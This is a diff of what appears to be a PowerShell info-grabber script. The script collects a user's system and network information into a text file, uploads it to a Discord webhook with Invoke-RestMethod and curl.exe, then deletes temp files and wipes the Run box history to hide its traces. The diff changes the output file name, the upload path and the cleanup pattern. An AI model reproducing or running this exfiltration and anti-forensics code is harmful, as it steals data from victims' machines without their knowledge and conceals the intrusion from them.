@@ -4,7 +4,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_info.txt"
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd)_xrjg.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # Network info
@@ -113,7 +113,8 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
+#if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -125,7 +126,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName
 
 # Delete contents of Temp folder 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:*_xrjg.txt -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
